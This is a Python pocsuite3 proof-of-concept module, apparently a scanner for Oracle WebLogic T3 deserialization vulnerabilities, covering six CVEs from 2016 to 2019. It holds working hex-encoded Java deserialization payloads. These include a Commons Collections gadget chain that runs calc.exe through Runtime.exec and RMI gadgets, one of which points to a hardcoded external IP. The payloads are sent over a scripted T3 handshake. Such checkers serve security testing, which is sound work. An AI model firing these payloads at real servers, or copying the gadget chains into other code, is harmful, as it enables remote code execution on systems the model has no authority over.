#!/usr/bin/env python
# coding: utf-8
import socket
import time
import re
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2018-12-25'
    createDate = '2018-12-25'
    updateDate = '2018-12-25'
    references = ['', ]
    name = 'Oracle Weblogic unserialize vulnerability check'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'Weblogic'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。

    '''

    def _verify(self):
        VUL = ['CVE-2016-0638',
               'CVE-2016-3510',
               'CVE-2017-3248',
               'CVE-2018-2628',
               'CVE-2018-2893',
               'CVE-2019-2890',
               ]
        PAYLOAD = ['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78',
                   'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870',
                   'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078',
                   'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707729000a556e69636173745265660000000005a2000000005649e3fd00000000000000000000000000000078',
                   'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000001251e200000000000000100000118aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e310000f1440000000046911fd80000000000000000000000000000007878',
                   'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078',
                   ]
        VER_SIG = [rb'weblogic.jms.common.StreamMessageImpl',
                   rb'org.apache.commons.collections.functors.InvokerTransformer',
                   rb'\$Proxy[0-9]+',
                   rb'\$Proxy[0-9]+',
                   rb'weblogic.jms.common.StreamMessageImpl',
                   rb'\$Proxy[0-9]+',
                   ]

        def t3handshake(sock, server_addr):
            sock.connect(server_addr)
            # .decode('hex'))
            sock.send(bytes.fromhex(
                '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
            time.sleep(1)
            sock.recv(1024)
            #print('[!]{}:{} handshake successful'.format(server_addr[0],server_addr[1]))

        def buildT3RequestObject(dip, sock):
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'
            data3 = '1a7727000d3234322e323134'
            data4 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3, data4]:
                sock.send(bytes.fromhex(d))  # d.decode('hex'))
            time.sleep(2)
            #print('[!]{} send request payload successful,recv length:{}'.format(dip,len(sock.recv(2048))))

        def sendEvilObjData(sock, data):
            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += data
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = '%s%s' % ('{:08x}'.format(
                int(len(payload)/2) + 4), payload)
            sock.send(bytes.fromhex(payload))  # payload.decode('hex'))
            time.sleep(2)
            res = 'NO_DATA'
            try:
                res = sock.recv(4096)
            except socket.timeout:
                pass
            # print res.encode('hex')
            return res

        def checkVul(res, server_addr, index):
            p = re.findall(VER_SIG[index], res, re.S)
            if len(p) > 0:
                #print('[+]%s:%d vul %s'%(server_addr[0],server_addr[1],VUL[index]))
                return True
            else:
                #print('[-]%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]))
                return False

        def run(dip, dport, index):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
            sock.settimeout(60)
            server_addr = (dip, dport)
            t3handshake(sock, server_addr)
            buildT3RequestObject(dip, sock)
            rs = sendEvilObjData(sock, PAYLOAD[index])
            checkVul(rs, server_addr, index)

        def check(dip, dport):
            vuls = []
            for index in range(len(VUL)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # 打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
                    sock.settimeout(60)
                    server_addr = (dip, dport)
                    t3handshake(sock, server_addr)
                    buildT3RequestObject(dip, sock)
                    rs = sendEvilObjData(sock, PAYLOAD[index])
                    if checkVul(rs, server_addr, index):
                        vuls.append(VUL[index])
                except Exception as e:
                    #print('[-]{} fail:{}'.format(dip,str(e)))
                    raise
                time.sleep(2)
            return (True if len(vuls) > 0 else False, ' '.join(vuls))
        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [7001, 17001, 27001]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status, msg = check(pr.hostname, port)
            if status:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = uri
                result['extra'] = {}
                result['extra']['evidence'] = msg
                break

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
